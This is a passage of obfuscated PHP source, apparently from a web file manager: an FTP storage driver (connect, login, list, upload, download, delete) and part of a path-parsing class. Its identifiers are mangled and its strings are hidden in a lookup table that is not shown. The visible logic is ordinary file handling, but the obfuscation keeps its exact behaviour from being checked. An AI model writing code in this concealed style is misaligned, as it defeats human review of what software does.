$this->charsetReset($—‡¯Íğ); foreach ($—‡¯Íğ as $³£Ñô• => $åÜğİéê) { if (isset($this->{$³£Ñô•})) { $this->{$³£Ñô•} = $åÜğİéê; } } return $this->_login($—‡¯Íğ); } private function _login($–ËÛòğÛ) { $Î´ş„µÑ =& $_SERVER[áäÒ½¯Ç]; static $ÖÌŠÉÔ½ = array(); $š˜ªåì = md5(json_encode($–ËÛòğÛ)); if (isset($ÖÌŠÉÔ½[$š˜ªåì])) { foreach ($ÖÌŠÉÔ½[$š˜ªåì] as $ÉÂÏ¯æë => $Œø¯˜õß) { $this->{$ÉÂÏ¯æë} = $Œø¯˜õß; } return !0; } $°Ÿş„Š¿ = parse_url(trim($this->server, $Î´ş„µÑ[8])); $this->host = $°Ÿş„Š¿[$Î´ş„µÑ[207]]; $Ù¹ºÃ×Á = isset($°Ÿş„Š¿[$Î´ş„µÑ[206]]) && $°Ÿş„Š¿[$Î´ş„µÑ[206]] == $Î´ş„µÑ[1600] ? !0 : !1; $this->scheme = $Ù¹ºÃ×Á ? $Î´ş„µÑ[1601] : $Î´ş„µÑ[1602]; $this->port = isset($°Ÿş„Š¿[$Î´ş„µÑ[208]]) ? $°Ÿş„Š¿[$Î´ş„µÑ[208]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Î´ş„µÑ[1603]) . $this->host . $Î´ş„µÑ[4] . $this->port, !0); return !1; } $ÍáÎï©ª = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ÍáÎï©ª) { $this->writeLog(LNG($Î´ş„µÑ[1604]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $Î´ş„µÑ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $··ªúè = $this->pasv == $Î´ş„µÑ[91] ? !0 : !1; @ftp_pasv($this->connect, $··ªúè); $ÖÌŠÉÔ½[$š˜ªåì] = array($Î´ş„µÑ[1605] => $this->connect, $Î´ş„µÑ[207] => $this->host, $Î´ş„µÑ[206] => $this->scheme, $Î´ş„µÑ[208] => $this->port); return $ÍáÎï©ª; } private function _isconn($èÔéê“¶ = true) { if (is_resource($this->connect)) { return !0; } if (!$èÔéê“¶) { return !1; } return $this->_login($this->config); } public function mkfile($¶‡üÙ, $¬¿¦êÎ’ = '', $‡Şíƒ¬ï = REPEAT_RENAME) { if ($this->setContent($¶‡üÙ, $¬¿¦êÎ’)) { return $this->getPathOuter($¶‡üÙ); } $this->writeLog(LNG($_SERVER[áäÒ½¯Ç][1606]), !0); return !1; } public function mkdir($Å¨İ¤‚§, $¤›êÉàÕ = REPEAT_SKIP) { $Ê ¨Ï÷ =& $_SERVER[áäÒ½¯Ç]; if (!$Å¨İ¤‚§ || $Å¨İ¤‚§ == $Ê ¨Ï÷[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Å¨İ¤‚§ = $this->iconvSystem($Å¨İ¤‚§); if ($this->_isFolder($Å¨İ¤‚§) || @ftp_mkdir($this->connect, $Å¨İ¤‚§)) { return $this->getPathOuter($Å¨İ¤‚§); } if (!$this->mkdir($this->pathFather($Å¨İ¤‚§))) { return !1; } if ($Å¨İ¤‚§ = @ftp_mkdir($this->connect, $Å¨İ¤‚§)) { return $this->getPathOuter($Å¨İ¤‚§); } $È¬à¥ı¸ = __FUNCTION__ . $Ê ¨Ï÷[1607]; $this->writeLog($È¬à¥ı¸, !0); return !1; } public function copyFile($Õåè«’, $ƒüâ‹Ö›) { if (!$this->_isconn()) { return !1; } $Ò£éıÅÄ = $this->pathThis($this->iconvSystem($Õåè«’)); $Œµ“Ùè = $this->tempFile($Ò£éıÅÄ); $ãË—Ğ»ç = $this->iconvApp($Œµ“Ùè); $this->download($Õåè«’, $ãË—Ğ»ç); $«µ”³øÚ = $this->upload($ƒüâ‹Ö›, $ãË—Ğ»ç); $this->tempFileRemve($Œµ“Ùè); return $«µ”³øÚ; } public function moveFile($‹ÌøÎ©¢, $¦²Ñé•Ì) { if (!$this->_isconn()) { return !1; } $‹ÌøÎ©¢ = $this->iconvSystem($‹ÌøÎ©¢); $¦²Ñé•Ì = $this->iconvSystem($¦²Ñé•Ì); $™íã»€Ì = @ftp_rename($this->connect, $‹ÌøÎ©¢, $¦²Ñé•Ì); if (!$™íã»€Ì) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } return $this->getPathOuter($¦²Ñé•Ì); } public function delFile($‚ç˜¦âñ) { if (!$this->_isconn()) { return !1; } $‚ç˜¦âñ = $this->iconvSystem($‚ç˜¦âñ); $şñş«ª¾ = @ftp_delete($this->connect, $‚ç˜¦âñ); if (!$şñş«ª¾) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); } return $şñş«ª¾; } public function delFolder($–Ç¡Šñ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $û›ô¬á¥ = $ˆ‚ª’¾Ã = array(); $this->fileList($–Ç¡Šñ, $û›ô¬á¥, $ˆ‚ª’¾Ã, !0); $this->listItemCache = !0; foreach ($ˆ‚ª’¾Ã as $˜ºÌäŒ¯) { $Öå‚°ÑÙ = $this->iconvSystem($˜ºÌäŒ¯[$_SERVER[áäÒ½¯Ç][32]]); $¬æ Ú£Á = @ftp_delete($this->connect, $Öå‚°ÑÙ); if (!$¬æ Ú£Á) { return !1; } } foreach ($û›ô¬á¥ as $Öå‚°ÑÙ) { $Öå‚°ÑÙ = $this->iconvSystem($Öå‚°ÑÙ); $¬æ Ú£Á = @ftp_rmdir($this->connect, $Öå‚°ÑÙ); if (!$¬æ Ú£Á) { return !1; } } $–Ç¡Šñ = $this->iconvSystem($–Ç¡Šñ); return @ftp_rmdir($this->connect, $–Ç¡Šñ); } public function rename($õ‹„ÓÅş, $ˆ¹øêÏ³) { $®¤ñª¯¢ =& $_SERVER[áäÒ½¯Ç]; if (!$this->_isconn()) { return !1; } $½ö‚èØÍ = $this->fileNameAuto($this->pathFather($õ‹„ÓÅş), $ˆ¹øêÏ³); $½ö‚èØÍ = $this->iconvSystem($½ö‚èØÍ); $õ‹„ÓÅş = $this->iconvSystem($õ‹„ÓÅş); $ºçÉ£„Ş = $this->pathFather($õ‹„ÓÅş); $ßŞ¿ñØÓ = rtrim($ºçÉ£„Ş, $®¤ñª¯¢[8]) . $®¤ñª¯¢[8] . $½ö‚èØÍ; $›Çê•ÈÌ = @ftp_rename($this->connect, $õ‹„ÓÅş, $ßŞ¿ñØÓ); if (!$›Çê•ÈÌ) { $this->writeLog(__FUNCTION__ . $®¤ñª¯¢[1607], !0); return !1; } $ßŞ¿ñØÓ = $this->iconvApp($ßŞ¿ñØÓ); return $this->getPathOuter($ßŞ¿ñØÓ); } private function folderInfo($³•ÊÂ„â, $àşœ­ş° = false) { $òóäğ =& $_SERVER[áäÒ½¯Ç]; $å©ğÂ¦ä = array($òóäğ[32] => $this->pathThis($³•ÊÂ„â), $òóäğ[87] => $this->getPathOuter($òóäğ[8] . $³•ÊÂ„â), $òóäğ[33] => $òóäğ[78]); if ($àşœ­ş°) { return $å©ğÂ¦ä; } $å©ğÂ¦ä[$òóäğ[242]] = $å©ğÂ¦ä[$òóäğ[88]] = 0; $å©ğÂ¦ä[$òóäğ[243]] = $å©ğÂ¦ä[$òóäğ[244]] = !0; return $å©ğÂ¦ä; } private function fileInfo($½”ûŞ, $ËÆ¿Ú›Â = false, $ÙÌ¸Éä  = array()) { $ÚíÊ¨É— =& $_SERVER[áäÒ½¯Ç]; $ìÃÙ‚õ¢ = array($ÚíÊ¨É—[32] => $this->pathThis($½”ûŞ), $ÚíÊ¨É—[87] => $this->getPathOuter($ÚíÊ¨É—[8] . $½”ûŞ), $ÚíÊ¨É—[33] => $ÚíÊ¨É—[241], $ÚíÊ¨É—[79] => isset($ÙÌ¸Éä [$ÚíÊ¨É—[79]]) ? $ÙÌ¸Éä [$ÚíÊ¨É—[79]] : 0, $ÚíÊ¨É—[167] => $this->ext($½”ûŞ)); if ($ËÆ¿Ú›Â) { return $ìÃÙ‚õ¢; } $ìÃÙ‚õ¢[$ÚíÊ¨É—[242]] = $ìÃÙ‚õ¢[$ÚíÊ¨É—[88]] = 0; $ìÃÙ‚õ¢[$ÚíÊ¨É—[243]] = $ìÃÙ‚õ¢[$ÚíÊ¨É—[244]] = !0; $úˆ¬»âœ = $this->iconvSystem($½”ûŞ); $ìÃÙ‚õ¢[$ÚíÊ¨É—[88]] = @ftp_mdtm($this->connect, $úˆ¬»âœ); if (empty($ÙÌ¸Éä )) { $ÙÌ¸Éä  = $this->objectMeta($½”ûŞ); if (!$ÙÌ¸Éä ) { return $ìÃÙ‚õ¢; } } $ìÃÙ‚õ¢[$ÚíÊ¨É—[79]] = $ÙÌ¸Éä [$ÚíÊ¨É—[79]]; return $ìÃÙ‚õ¢; } public function size($ÒõŠ’ºø) { $õ…ËßßÅ = $this->objectMeta($ÒõŠ’ºø); return $õ…ËßßÅ ? $õ…ËßßÅ[$_SERVER[áäÒ½¯Ç][79]] : 0; } public function info($“‹˜¶Úà) { if ($this->isFile($“‹˜¶Úà)) { return $this->fileInfo($“‹˜¶Úà, 0); } else { if ($this->isFolder($“‹˜¶Úà)) { return $this->folderInfo($“‹˜¶Úà); } } return !1; } private function fileList($¼‘øÍœó, &$‘ÁŒš×Æ, &$óèøèÕ¹, $İÍªƒÙ = false) { $€íó·ì” =& $_SERVER[áäÒ½¯Ç]; $¼‘øÍœó = $this->iconvSystem($¼‘øÍœó); if (!$this->isFolder($¼‘øÍœó)) { return !1; } $¼‘øÍœó = rtrim($¼‘øÍœó, $€íó·ì”[8]) . $€íó·ì”[8]; check_abort(); $šë²ª—¿ = @ftp_rawlist($this->connect, $¼‘øÍœó); if (!$šë²ª—¿) { $šë²ª—¿ = array(); } $–Æ³«Ç = array($€íó·ì”[10] => 1, $€íó·ì”[1417] => 1); foreach ($šë²ª—¿ as $è´ß³¬Ü) { $Øóà•¦ = $this->_listItem($è´ß³¬Ü); if ($Øóà•¦[0] == $€íó·ì”[861]) { continue; } $Âç®†í = $Øóà•¦[8]; if (empty($Âç®†í) && $Âç®†í !== $€íó·ì”[239] || isset($–Æ³«Ç[$Âç®†í])) { continue; } $Âç®†í = $this->iconvApp($¼‘øÍœó . ltrim($Âç®†í, $€íó·ì”[8])); $€Ô›±ˆ = array($€íó·ì”[32] => $Âç®†í, $€íó·ì”[33] => $€íó·ì”[241], $€íó·ì”[79] => $Øóà•¦[4]); if (substr($è´ß³¬Ü, 0, 1) == $€íó·ì”[1608]) { $€Ô›±ˆ[$€íó·ì”[33]] = $€íó·ì”[78]; $€Ô›±ˆ[$€íó·ì”[79]] = 0; } $©¤½›Ûö = $€Ô›±ˆ[$€íó·ì”[33]] == $€íó·ì”[78] ? !0 : !1; $this->cacheMethodInfoSet($Âç®†í, $©¤½›Ûö, $€Ô›±ˆ); if ($©¤½›Ûö) { $‘ÁŒš×Æ[] = $Âç®†í; if ($İÍªƒÙ) { $this->fileList($Âç®†í, $‘ÁŒš×Æ, $óèøèÕ¹, $İÍªƒÙ); } continue; } $óèøèÕ¹[] = $€Ô›±ˆ; } $this->cacheMethodInfoSet($¼‘øÍœó, !0); } private function _listItem($²ÉÑÖ¤») { if (empty($²ÉÑÖ¤»)) { return array(); } $œªíó = preg_split($_SERVER[áäÒ½¯Ç][1609], $²ÉÑÖ¤»); if (count($œªíó) <= 9) { return $œªíó; } $œªíó[8] = trim(substr($²ÉÑÖ¤», strpos($²ÉÑÖ¤», $œªíó[7]) + strlen($œªíó[7]))); return array_splice($œªíó, 0, 9); } public function listPath($èÇ«³­, $³ôä•Ò¡ = false) { $îÎîàúá =& $_SERVER[áäÒ½¯Ç]; if (!$this->_isconn()) { return !1; } $ªñ”ø¼µ = $àÚ±À– = array(); $this->fileList($èÇ«³­, $ªñ”ø¼µ, $àÚ±À–); foreach ($ªñ”ø¼µ as $â“àæÂá => $Í³¥ùŠ¢) { $ªñ”ø¼µ[$â“àæÂá] = $this->folderInfo($Í³¥ùŠ¢, $³ôä•Ò¡); } foreach ($àÚ±À– as $â“àæÂá => $Í³¥ùŠ¢) { $àÚ±À–[$â“àæÂá] = $this->fileInfo($Í³¥ùŠ¢[$îÎîàúá[32]], $³ôä•Ò¡, $Í³¥ùŠ¢); } return array($îÎîàúá[85] => $ªñ”ø¼µ, $îÎîàúá[86] => $àÚ±À–); } public function has($üÂ»“ú½, $ƒıÓïŸ² = false, $Î‚ŞĞöÎ = true) { $åÁ‰ä§ê =& $_SERVER[áäÒ½¯Ç]; $‘üı‡à = $ÏÆ£ ¯Ö = array(); $â‡”ßà¾ = $ƒıÓïŸ² ? !0 : !1; $this->fileList($üÂ»“ú½, $‘üı‡à, $ÏÆ£ ¯Ö, $â‡”ßà¾); if ($ƒıÓïŸ²) { return array($åÁ‰ä§ê[250] => count($ÏÆ£ ¯Ö), $åÁ‰ä§ê[251] => count($‘üı‡à)); } if ($Î‚ŞĞöÎ) { if (count($ÏÆ£ ¯Ö)) { return !0; } } else { if (count($‘üı‡à)) { return !0; } } return !1; } public function listAll($Ú©¤) { $Š˜æıÈ =& $_SERVER[áäÒ½¯Ç]; if (!$this->_isconn()) { return !1; } $¥Ø‡Áœù = $ÔÍ§ÈœÎ = array(); $this->fileList($Ú©¤, $¥Ø‡Áœù, $ÔÍ§ÈœÎ, !0); $ƒ¾¤ªê‰ = array_to_keyvalue($ÔÍ§ÈœÎ, $Š˜æıÈ[32]); foreach ($¥Ø‡Áœù as $ıÔ„¶â©) { if (is_string($ıÔ„¶â©)) { $ƒ¾¤ªê‰[$ıÔ„¶â©] = array($Š˜æıÈ[79] => 0); } } return $this->listAllFiles($Ú©¤, $ƒ¾¤ªê‰); } public function getContent($ı—ÛÚ³) { if (!$this->_isconn()) { return !1; } $ı—ÛÚ³ = $this->iconvSystem($ı—ÛÚ³); return $this->fileSubstr($ı—ÛÚ³); } public function setContent($ÙŒÍÏ, $ƒÎëö§à = '') { if (!$this->_isconn()) { return !1; } $ƒ€ú£© = $this->pathThis($this->iconvSystem($ÙŒÍÏ)); $µ ºÅÚò = $this->tempFile($ƒ€ú£©); file_put_contents($µ ºÅÚò, $ƒÎëö§à); $³Ş§ç» = $this->upload($ÙŒÍÏ, $this->iconvApp($µ ºÅÚò)); $this->tempFileRemve($µ ºÅÚò); return $³Ş§ç»; } public function fileSubstr($øÖçâ½º, $ïÆ…ÁÛ = 0, $ˆ¢À†ÇÀ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($øÖçâ½º, $ïÆ…ÁÛ, $ˆ¢À†ÇÀ); } private function ftpRequest($£ßòïĞ, $ü€ã = 0, $€ƒÙ˜‚Õ = false) { $âÍ€ğ¤ =& $_SERVER[áäÒ½¯Ç]; $£ßòïĞ = $âÍ€ğ¤[8] . ltrim(str_ltrim($£ßòïĞ, $this->ftpPath), $âÍ€ğ¤[8]); $£ßòïĞ = $this->iconvSystem($£ßòïĞ); $Ì¾ÛµÇê = $this->scheme . $this->host . $âÍ€ğ¤[4] . $this->port; $ùøÌ’ = curl_init(); curl_setopt($ùøÌ’, CURLOPT_URL, $Ì¾ÛµÇê . $this->pathEncode($£ßòïĞ)); curl_setopt($ùøÌ’, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($€ƒÙ˜‚Õ) { $ãÑê­ø = $ü€ã + $€ƒÙ˜‚Õ - 1; curl_setopt($ùøÌ’, CURLOPT_RANGE, "{$ü€ã}\55{$ãÑê­ø}"); } curl_setopt($ùøÌ’, CURLOPT_RETURNTRANSFER, 1); $á¨Ê“çõ = curl_exec($ùøÌ’); curl_close($ùøÌ’); return $á¨Ê“çõ; } public function upload($¼Ÿú¨£¡, $ËŒŠûö¢, $¸ÂÄğÅú = false, $œ–ÚËË÷ = REPEAT_REPLACE) { if (!$ËŒŠûö¢ || !@file_exists($ËŒŠûö¢)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¼Ÿú¨£¡))) { return !1; } $¼Ÿú¨£¡ = $this->iconvSystem($¼Ÿú¨£¡); $ËŒŠûö¢ = $this->iconvSystem($ËŒŠûö¢); $ìËëò®É = ftp_nb_put($this->connect, $¼Ÿú¨£¡, $ËŒŠûö¢, FTP_BINARY); while ($ìËëò®É == FTP_MOREDATA) { $ìËëò®É = ftp_nb_continue($this->connect); } if ($ìËëò®É != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } return $this->getPathOuter($¼Ÿú¨£¡); } public function download($—«ü ›Í, $ï¿îÌïÃ = '') { if (!$this->_isconn()) { return !1; } $ËÀ·½˜Ç = $this->pathFather($ï¿îÌïÃ); if (!IO::mkdir($ËÀ·½˜Ç)) { return !1; } $—«ü ›Í = $this->iconvSystem($—«ü ›Í); $ï¿îÌïÃ = $this->iconvSystem($ï¿îÌïÃ); $á¦êäà = ftp_nb_get($this->connect, $ï¿îÌïÃ, $—«ü ›Í, FTP_BINARY); while ($á¦êäà == FTP_MOREDATA) { $á¦êäà = ftp_nb_continue($this->connect); } if ($á¦êäà != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } return $this->iconvApp($ï¿îÌïÃ); } public function exist($ë“Ö‘Âˆ) { return $this->isFile($ë“Ö‘Âˆ) || $this->isFolder($ë“Ö‘Âˆ); } public function isFile($‹å’Ëİ) { return !$this->isFolder($‹å’Ëİ) && $this->objectMeta($‹å’Ëİ); } public function isFolder($•ƒÀå¦ü) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][178], $•ƒÀå¦ü); } protected function objectMeta($óãÍÜÊ†) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][180], $óãÍÜÊ†); } protected function _objectMeta($‡İòëíÏ) { $…½Æí˜– =& $_SERVER[áäÒ½¯Ç]; if ($‡İòëíÏ == $…½Æí˜–[12] || $‡İòëíÏ == $…½Æí˜–[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‡İòëíÏ = $this->iconvSystem($‡İòëíÏ); $‘„ûá¹ = array($…½Æí˜–[32] => $this->iconvApp($‡İòëíÏ), $…½Æí˜–[33] => $…½Æí˜–[241], $…½Æí˜–[79] => 0); $²óáà×ß = @ftp_size($this->connect, $‡İòëíÏ); if ($²óáà×ß != -1) { $‘„ûá¹[$…½Æí˜–[79]] = $²óáà×ß; } else { $ŒëŠãõ£ = @ftp_chdir($this->connect, $‡İòëíÏ); if (!$ŒëŠãõ£) { return !1; } @ftp_chdir($this->connect, $…½Æí˜–[8]); $‘„ûá¹[$…½Æí˜–[33]] = $…½Æí˜–[78]; } return $‘„ûá¹; } protected function _isFolder($Ìï·‹«¸) { $ğò–®³ı =& $_SERVER[áäÒ½¯Ç]; if ($Ìï·‹«¸ == $ğò–®³ı[12] || $Ìï·‹«¸ == $ğò–®³ı[8]) { return !0; } $‡”„ñ = $this->_objectMeta($Ìï·‹«¸); return isset($‡”„ñ[$ğò–®³ı[33]]) && $‡”„ñ[$ğò–®³ı[33]] == $ğò–®³ı[78] ? !0 : !1; } } goto Cå‘¸¤’ô©; DäÅŒ“ÀêÜ: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\x52\145\x63\171\143\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\x46\151\154\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\106\151\x6c\145\x54\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\165\160\122\157\x6f\164\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\165\x73\145\162\123\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\162\x53\150\x61\162\x65\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\162\x65\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\x65\111\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\162\145\x49\164\x65\155\x4c\x69\156\x6b\175"; const KOD_SHARE_OUTER = "\x7b\163\x68\x61\x72\145\111\x74\x65\x6d\117\165\x74\175"; const KOD_SEARCH = "\173\x73\x65\x61\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\143\x6b\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\122\145\x6e\143\145\156\x74\175"; const KOD_USER_DRIVER = "\173\x64\162\x69\166\145\x72\175"; public static function typeList() { $Ğ’×Ïâß =& $_SERVER[áäÒ½¯Ç]; return array($Ğ’×Ïâß[1388] => self::KOD_SOURCE, $Ğ’×Ïâß[1389] => self::KOD_USER_RECYCLE, $Ğ’×Ïâß[1390] => self::KOD_USER_FAV, $Ğ’×Ïâß[1391] => self::KOD_USER_FILE_TAG, $Ğ’×Ïâß[1392] => self::KOD_USER_FILE_TYPE, $Ğ’×Ïâß[1393] => self::KOD_GROUP_ROOT_SELF, $Ğ’×Ïâß[1394] => self::KOD_USER_SHARE, $Ğ’×Ïâß[1395] => self::KOD_USER_SHARE_LINK, $Ğ’×Ïâß[1396] => self::KOD_USER_SHARE_TO_ME, $Ğ’×Ïâß[1397] => self::KOD_SHARE_ITEM, $Ğ’×Ïâß[1398] => self::KOD_SHARE_LINK, $Ğ’×Ïâß[1399] => self::KOD_SHARE_OUTER, $Ğ’×Ïâß[1400] => self::KOD_SEARCH, $Ğ’×Ïâß[1401] => self::KOD_BLOCK, $Ğ’×Ïâß[1402] => self::KOD_IO, $Ğ’×Ïâß[1403] => self::KOD_USER_RECENT, $Ğ’×Ïâß[1404] => self::KOD_USER_DRIVER); } public static function parse($ËÙÛÁË›) { $áû©÷‘ü =& $_SERVER[áäÒ½¯Ç]; $ËÙÛÁË› = self::clear($ËÙÛÁË›); $àªåé‘÷ = array_values(self::typeList()); preg_match($áû©÷‘ü[1405], $ËÙÛÁË›, $ãÛ›Ñºş); $Ä‹õš¥Á = array($áû©÷‘ü[516] => !1, $áû©÷‘ü[1406] => !1, $áû©÷‘ü[513] => !1, $áû©÷‘ü[87] => $ËÙÛÁË›, $áû©÷‘ü[1303] => !1, $áû©÷‘ü[1302] => $áû©÷‘ü[12]); if (is_array($ãÛ›Ñºş) && count($ãÛ›Ñºş) == 5) { $Ñ×Ã°€ = $áû©÷‘ü[1407] . $ãÛ›Ñºş[2] . $áû©÷‘ü[412]; if (in_array($Ñ×Ã°€, $àªåé‘÷)) { $Ä‹õš¥Á[$áû©÷‘ü[1303]] = $ãÛ›Ñºş[1]; $Ä‹õš¥Á[$áû©÷‘ü[33]] = $Ñ×Ã°€; $Ä‹õš¥Á[$áû©÷‘ü[1408]] = substr($Ñ×Ã°€, 1, -1); $Ä‹õš¥Á[$áû©÷‘ü[492]] = $ãÛ›Ñºş[3]; } $Ä‹õš¥Á[$áû©÷‘ü[1302]] = $ãÛ›Ñºş[4]; } if ($Ä‹õš¥Á[$áû©÷‘ü[516]] == self::KOD_SOURCE) { $Ä‹õš¥Á[$áû©÷‘ü[492]] = intval($Ä‹õš¥Á[$áû©÷‘ü[492]]); $Ä‹õš¥Á[$áû©÷‘ü[1306]] = $Ä‹õš¥Á[$áû©÷‘ü[492]]; } $¾¦¸ºáı = array($áû©÷‘ü[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $Ä‹õš¥Á[$áû©÷‘ü[1370]] = in_array($Ä‹õš¥Á[$áû©÷‘ü[33]], $¾¦¸ºáı); return $Ä‹õš¥Á; } public static function isTruePath($ü´ûÖ·) { $ÃØĞ¶ÏÎ =& $_SERVER[áäÒ½¯Ç]; if (substr($ü´ûÖ·, 0, 1) != $ÃØĞ¶ÏÎ[1407]) { return !0; } if (strpos($ü´ûÖ·, $ÃØĞ¶ÏÎ[503]) === 0) { return !0; } if (strpos($ü´ûÖ·, $ÃØĞ¶ÏÎ[1374]) === 0) { return !0; } if (strpos($ü´ûÖ·, $ÃØĞ¶ÏÎ[1409]) === 0) { return !0; } if (strpos($ü´ûÖ·, $ÃØĞ¶ÏÎ[1410]) === 0) { return !0; } if (strpos($ü´ûÖ·, $ÃØĞ¶ÏÎ[1411]) === 0) { return !0; } if (strpos($ü´ûÖ·, $ÃØĞ¶ÏÎ[1412]) === 0) { return !0; } return !1; } public static function clear($¥áİÏÇÈ) { $¡Ğñ¹İ  =& $_SERVER[áäÒ½¯Ç]; $¥áİÏÇÈ = str_replace(array($¡Ğñ¹İ [1196], $¡Ğñ¹İ [221]), $¡Ğñ¹İ [53], $¥áİÏÇÈ); $¥áİÏÇÈ = str_replace($¡Ğñ¹İ [98], $¡Ğñ¹İ [8], $¥áİÏÇÈ); $¹¥¢Ÿ© = $¡Ğñ¹İ [1413]; if (substr($¥áİÏÇÈ, 0, 3) == $¡Ğñ¹İ [1414]) { $¥áİÏÇÈ = substr($¥áİÏÇÈ, 3); } while (strstr($¥áİÏÇÈ, $¹¥¢Ÿ©)) { $¥áİÏÇÈ = str_replace($¹¥¢Ÿ©, $¡Ğñ¹İ [8], $¥áİÏÇÈ); } $¥áİÏÇÈ = preg_replace($¡Ğñ¹İ [1415], $¡Ğñ¹İ [8], $¥áİÏÇÈ); if ($¥áİÏÇÈ == $¡Ğñ¹İ [8]) { return $¡Ğñ¹İ [8]; } $¥áİÏÇÈ = rtrim($¥áİÏÇÈ, $¡Ğñ¹İ [8]); return $¥áİÏÇÈ; } public static function pathTrue($¾¤ÔÛİ) { $—ƒ˜Û ¯ =& $_SERVER[áäÒ½¯Ç]; if (!$¾¤ÔÛİ) { return $—ƒ˜Û ¯[12]; } $¾¤ÔÛİ = str_replace($—ƒ˜Û ¯[265], $—ƒ˜Û ¯[8], str_replace($—ƒ˜Û ¯[1416], $—ƒ˜Û ¯[8], $¾¤ÔÛİ)); $¾¤ÔÛİ = str_replace($—ƒ˜Û ¯[265], $—ƒ˜Û ¯[8], str_replace($—ƒ˜Û ¯[1416], $—ƒ˜Û ¯[8], $¾¤ÔÛİ)); if (!strstr($¾¤ÔÛİ, $—ƒ˜Û ¯[1414])) { return $¾¤ÔÛİ; } $ÛêĞ´Îä = explode($—ƒ˜Û ¯[8], $¾¤ÔÛİ); foreach ($ÛêĞ´Îä as $ã›¾ïÉ => $Èûî¥Îø) { if ($Èûî¥Îø !== $—ƒ˜Û ¯[1417]) { continue; } for ($„Šñø = $ã›¾ïÉ; $„Šñø >= 0; $„Šñø--) { if ($ÛêĞ´Îä[$„Šñø] === $—ƒ˜Û ¯[10] || $ÛêĞ´Îä[$„Šñø] === $—ƒ˜Û ¯[1417] || $ÛêĞ´Îä[$„Šñø] === -1) { continue; } if ($ÛêĞ´Îä[$„Šñø] === $—ƒ˜Û ¯[12]) { $ÛêĞ´Îä[$ã›¾ïÉ] = -1; break; } $ÛêĞ´Îä[$ã›¾ïÉ] = -1; $ÛêĞ´Îä[$„Šñø] = -1; break; } } $¨¸‰ = array(); foreach ($ÛêĞ´Îä as $Èûî¥Îø) { if ($Èûî¥Îø !== -1) { $¨¸‰[] = $Èûî¥Îø; } } $å¾²ÑÚ = implode($—ƒ˜Û ¯[8], $¨¸‰); if (strpos($å¾²ÑÚ, $—ƒ˜Û ¯[1418]) === 0) { $å¾²ÑÚ = $—ƒ˜Û ¯[1414] . substr($å¾²ÑÚ, strlen($—ƒ˜Û ¯[1418])); } return $å¾²ÑÚ; } public static function pathUrlClear($Œ¼è‡ÔÜ) { $ÃæÜºı =& $_SERVER[áäÒ½¯Ç]; if (!$Œ¼è‡ÔÜ) { return $Œ¼è‡ÔÜ; } $Œ¼è‡ÔÜ = rawurldecode($Œ¼è‡ÔÜ); $Œ¼è‡ÔÜ = str_replace($ÃæÜºı[1416], $ÃæÜºı[8], $Œ¼è‡ÔÜ); if (strpos($Œ¼è‡ÔÜ, $ÃæÜºı[76]) > 0) { $Œ¼è‡ÔÜ = substr($Œ¼è‡ÔÜ, 0, strpos($Œ¼è‡ÔÜ, $ÃæÜºı[76])); } if (strpos($Œ¼è‡ÔÜ, $ÃæÜºı[1419]) > 0) { $Œ¼è‡ÔÜ = substr($Œ¼è‡ÔÜ, 0, strpos($Œ¼è‡ÔÜ, $ÃæÜºı[1419])); } return $Œ¼è‡ÔÜ; } public static function sourceID($—ªƒ»ñ‹) { $ôÉı‘ú =& $_SERVER[áäÒ½¯Ç]; $—ûµˆ¢´ = self::parse($—ªƒ»ñ‹); if ($—ûµˆ¢´[$ôÉı‘ú[33]] !== self::KOD_SOURCE) { show_json(LNG($ôÉı‘ú[1420]), !1); } return $—ûµˆ¢´[$ôÉı‘ú[492]]; } public static function make($ËéçÜŞ¼) { if (!$ËéçÜŞ¼) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ËéçÜŞ¼)); } public static function makeShare($¶˜ßù¼°, $ı¾‚ç”) { return self::makePath(self::KOD_SHARE_ITEM, $¶˜ßù¼°, $ı¾‚ç”); } public static function makeFileTypePath($ÂÍíË) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÂÍíË); } public static function makeFileTagPath($´ª¥ºã£) { return self::makePath(self::KOD_USER_FILE_TAG, $´ª¥ºã£); } public static function makePath($”—¢’Ñ , $ó¬•Ì = '', $“ÁÕœ»§ = '') { $ŒîŞ†ı¾ =& 